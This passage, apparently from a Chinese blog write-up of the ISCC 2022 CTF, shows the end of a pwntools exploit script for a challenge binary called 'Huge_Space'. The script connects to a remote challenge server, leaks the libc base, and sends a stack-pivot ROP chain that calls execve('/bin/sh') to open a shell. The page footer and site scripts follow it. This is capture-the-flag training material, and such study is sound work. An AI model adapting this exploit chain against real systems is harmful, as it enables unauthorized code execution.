<span class="line" data-line="5"><span style="color:#E1E4E8">context.terminal </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">"/bin/tmux"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"sp"</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"-h"</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="6"></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">io </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> remote(</span><span style="color:#9ECBFF">'123.57.69.203'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">5330</span><span style="color:#E1E4E8"> )</span></span>
<span class="line" data-line="8"><span style="color:#6A737D"># libc = ELF('./libc-2.31.so')</span></span>
<span class="line" data-line="9"><span style="color:#6A737D"># io = process('./Huge_Space')</span></span>
<span class="line" data-line="10"><span style="color:#E1E4E8">libc </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">'./libc.so.6'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">elf </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ELF(</span><span style="color:#9ECBFF">'./Huge_Space'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="12"></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">l64 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">      :u64(io.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x7f</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8">l32 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">      :u32(io.recvuntil(</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\xf7</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">)[</span><span style="color:#F97583">-</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:].ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">rl </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">	a</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">		: io.recvline(a)</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">ru </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#E1E4E8">	: io.recvuntil(a,b)</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">rn </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> x			: io.recvn(x)</span></span>
<span class="line" data-line="18"><span style="color:#E1E4E8">sn </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> x			: io.send(x)</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">sl </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> x			: io.sendline(x)</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">sa </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b			: io.sendafter(a,b)</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">sla </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> a,b		: io.sendlineafter(a,b)</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">irt </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8">			: io.interactive()</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">dbg </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> text</span><span style="color:#F97583">=</span><span style="color:#79B8FF">None</span><span style="color:#E1E4E8">  : gdb.attach(io, text)</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">lg </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> s			: log.info(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\033</span><span style="color:#9ECBFF">[1;31;40m </span><span style="color:#79B8FF">%s</span><span style="color:#9ECBFF"> --> 0x</span><span style="color:#79B8FF">%x</span><span style="color:#79B8FF"> \033</span><span style="color:#9ECBFF">[0m'</span><span style="color:#F97583"> %</span><span style="color:#E1E4E8"> (s, </span><span style="color:#79B8FF">eval</span><span style="color:#E1E4E8">(s)))</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">uu32 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data		: u32(data.ljust(</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">uu64 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data		: u64(data.ljust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">ur64 </span><span style="color:#F97583">=</span><span style="color:#F97583"> lambda</span><span style="color:#E1E4E8"> data		: u64(data.rjust(</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">))</span></span>
<span class="line" data-line="28"></span>
<span class="line" data-line="29"></span>
<span class="line" data-line="30"><span style="color:#F97583">def</span><span style="color:#B392F0"> add</span><span style="color:#E1E4E8">(idx,size,content):</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">	sl(</span><span style="color:#9ECBFF">'+++'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="32"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">'Index:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(idx))</span></span>
<span class="line" data-line="33"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">'Size: '</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(size))</span></span>
<span class="line" data-line="34"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">'Data: '</span><span style="color:#E1E4E8">,content)</span></span>
<span class="line" data-line="35"><span style="color:#F97583">def</span><span style="color:#B392F0"> show</span><span style="color:#E1E4E8">(idx,size):</span></span>
<span class="line" data-line="36"><span style="color:#E1E4E8">	sl(</span><span style="color:#9ECBFF">'print'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="37"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">'Index:'</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(idx))</span></span>
<span class="line" data-line="38"><span style="color:#E1E4E8">	sla(</span><span style="color:#9ECBFF">'Size: '</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">str</span><span style="color:#E1E4E8">(size))</span></span>
<span class="line" data-line="39"></span>
<span class="line" data-line="40"></span>
<span class="line" data-line="41"><span style="color:#E1E4E8">pop_rdi </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">0000000000400be3</span></span>
<span class="line" data-line="42"><span style="color:#E1E4E8">pop_rsi_r15 </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">0000000000400be1</span></span>
<span class="line" data-line="43"><span style="color:#E1E4E8">pop_rdx </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">0000000000001b96</span></span>
<span class="line" data-line="44"><span style="color:#E1E4E8">pop_rbp </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">0000000000400860</span></span>
<span class="line" data-line="45"><span style="color:#E1E4E8">leaveret </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">40090F</span></span>
<span class="line" data-line="46"><span style="color:#E1E4E8">sh </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">400909</span></span>
<span class="line" data-line="47"><span style="color:#E1E4E8">writee </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">400B19</span></span>
<span class="line" data-line="48"><span style="color:#6A737D"># dbg()</span></span>
<span class="line" data-line="49"><span style="color:#E1E4E8">sl(</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">8</span><span style="color:#F97583">*</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(pop_rbp)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">6010c0</span><span style="color:#F97583">+0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(leaveret))</span></span>
<span class="line" data-line="50"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">10</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'A'</span><span style="color:#F97583">*0x</span><span style="color:#79B8FF">10</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">d81</span><span style="color:#E1E4E8">))</span><span style="color:#6A737D">#0</span></span>
<span class="line" data-line="51"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">1000</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'B'</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#1</span></span>
<span class="line" data-line="52"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">d50</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#1</span></span>
<span class="line" data-line="53"><span style="color:#6A737D"># add(2,0x1fa0,'')#2</span></span>
<span class="line" data-line="54"><span style="color:#E1E4E8">show(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">20</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="55"><span style="color:#6A737D"># show(2,0x20)</span></span>
<span class="line" data-line="56"></span>
<span class="line" data-line="57"><span style="color:#6A737D"># irt()</span></span>
<span class="line" data-line="58"><span style="color:#E1E4E8">libcbase </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> l64() </span><span style="color:#F97583">-</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">3ebc00</span></span>
<span class="line" data-line="59"><span style="color:#E1E4E8">lg(</span><span style="color:#9ECBFF">'libcbase'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="60"><span style="color:#E1E4E8">execve </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> libcbase </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> libc.symbols[</span><span style="color:#9ECBFF">'execve'</span><span style="color:#E1E4E8">]</span></span>
<span class="line" data-line="61"><span style="color:#E1E4E8">lg(</span><span style="color:#9ECBFF">'execve'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="62"></span>
<span class="line" data-line="63"><span style="color:#E1E4E8">sl(</span><span style="color:#9ECBFF">'666'</span><span style="color:#E1E4E8">)</span></span>
<span class="line" data-line="64"><span style="color:#6A737D"># dbg()</span></span>
<span class="line" data-line="65"><span style="color:#E1E4E8">add(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">22000</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">24518</span><span style="color:#F97583">+</span><span style="color:#79B8FF">16</span><span style="color:#F97583">*</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#9ECBFF">'</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#F97583">*</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">)</span><span style="color:#6A737D">#3 local 0x24828 8273</span></span>
<span class="line" data-line="66"></span>
<span class="line" data-line="67"><span style="color:#E1E4E8">sl(</span><span style="color:#9ECBFF">'exit</span><span style="color:#79B8FF">\x00\x00\x00\x00</span><span style="color:#9ECBFF">/bin/sh</span><span style="color:#79B8FF">\x00</span><span style="color:#9ECBFF">'</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(pop_rdi)</span><span style="color:#F97583">*</span><span style="color:#79B8FF">2</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#F97583">0x</span><span style="color:#79B8FF">6010c0</span><span style="color:#F97583">+</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(pop_rsi_r15)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">*</span><span style="color:#79B8FF">2</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(pop_rdx</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">libcbase)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">+</span><span style="color:#E1E4E8">p64(execve))</span></span>
<span class="line" data-line="68"></span>
<span class="line" data-line="69"><span style="color:#E1E4E8">irt()</span></span></code></pre>   </section> <footer class="mt-12 pt-8 border-t border-gray-200 dark:border-gray-700"> <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-lg text-sm text-gray-700 dark:text-gray-300 space-y-2 relative overflow-hidden transition-colors duration-300">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none text-gray-600 dark:text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="currentColor" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/iscc-2022/index.html" target="_blank" rel="noopener" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 break-all transition-colors duration-300"> https://5ime.cn/iscc-2022/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 transition-colors duration-300">
CC BY-NC-SA 4.0 CN
</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" class="transition-colors duration-300"></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.DMKo1lxI.js"></script>  </div> <div id="custom-lightbox" class="lightbox" style="display: none;" data-astro-cid-vqtgpguw>  <div id="lightbox-images" data-astro-cid-vqtgpguw></div> <div class="toolbar" data-astro-cid-vqtgpguw> <div class="counter" data-astro-cid-vqtgpguw> <span data-astro-cid-vqtgpguw><b id="current" data-astro-cid-vqtgpguw>1</b>/<span id="total" data-astro-cid-vqtgpguw>0</span></span> </div> <div class="nav" data-astro-cid-vqtgpguw> <div class="btn" id="prev" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M31 36L19 24L31 12" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> <div class="btn" id="next" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M19 12L31 24L19 36" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> <div class="btn" id="close" data-astro-cid-vqtgpguw> <svg width="16" height="16" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M8 8L40 40M8 40L40 8" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> </div> <script type="module">class o{index=0;images=[];elements;constructor(){this.elements={lightbox:document.getElementById("custom-lightbox"),container:document.getElementById("lightbox-images"),prev:document.getElementById("prev"),next:document.getElementById("next"),close:document.getElementById("close"),current:document.getElementById("current"),total:document.getElementById("total")},this.init()}init(){this.elements.prev.onclick=()=>this.navigate(-1),this.elements.next.onclick=()=>this.navigate(1),this.elements.close.onclick=()=>this.close(),this.elements.lightbox.onclick=e=>{e.target===this.elements.lightbox&&this.close()},document.onkeydown=e=>{this.elements.lightbox.style.display==="flex"&&(e.key==="ArrowLeft"?this.navigate(-1):e.key==="ArrowRight"?this.navigate(1):e.key==="Escape"&&this.close())}}open(e,t=0){this.images=e,this.index=t,this.render(),this.elements.lightbox.style.display="flex",this.elements.lightbox.classList.remove("exit"),document.body.style.overflow="hidden"}navigate(e){const t=this.index+e;t>=0&&t<this.images.length&&(this.index=t,this.render())}render(){const{src:e,alt:t}=this.images[this.index],i=new Image;i.onload=()=>{this.elements.container.innerHTML=`<img src="${e}" alt="${t}">`;const s=this.elements.container.querySelector("img");if(window.innerWidth>768){const n=window.innerWidth*.8,l=window.innerHeight*.75;(i.naturalWidth>n||i.naturalHeight>l)&&(s.style.maxWidth=`${n}px`,s.style.maxHeight=`${l}px`)}requestAnimationFrame(()=>s.classList.add("show"))},i.src=e,this.elements.current.textContent=(this.index+1).toString(),this.elements.total.textContent=this.images.length.toString(),this.elements.prev.style.opacity=this.index===0?"0.3":"1",this.elements.next.style.opacity=this.index===this.images.length-1?"0.3":"1"}close(){this.elements.lightbox.classList.add("exit"),document.body.style.overflow="",setTimeout(()=>this.elements.lightbox.style.display="none",300)}}window.customLightbox=new o;</script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-gray-700 dark:text-gray-400" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2026 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-8Z68BHM5GN');
</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("article");if(e&&window.customLightbox){const n=e.getElementsByTagName("img"),o=[];Array.from(n).forEach((t,a)=>{t.alt||(t.alt=`文章配图 ${a+1}`),o.push({src:t.src,alt:t.alt}),t.style.cursor="pointer",t.addEventListener("click",()=>{window.customLightbox.open(o,a)})})}});</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelectorAll("[data-live-photo]");if(!o.length)return;const e=()=>{o.forEach(t=>{t.setAttribute("data-live-photo-initialized","true")})},i=()=>{const{LivePhotosKit:t}=window;try{t?.Player?.initialize()}catch(n){console.error("LivePhotosKit 初始化失败:",n)}e()};if(window.LivePhotosKit)i();else{const t=document.createElement("script");Object.assign(t,{src:"https://cdn.apple-livephotoskit.com/lpk/1/livephotoskit.js",async:!0,crossOrigin:"anonymous",onerror:()=>{console.error("LivePhotosKit 脚本加载失败"),e()},onload:()=>setTimeout(i,100)}),document.head.appendChild(t)}});</script></body></html>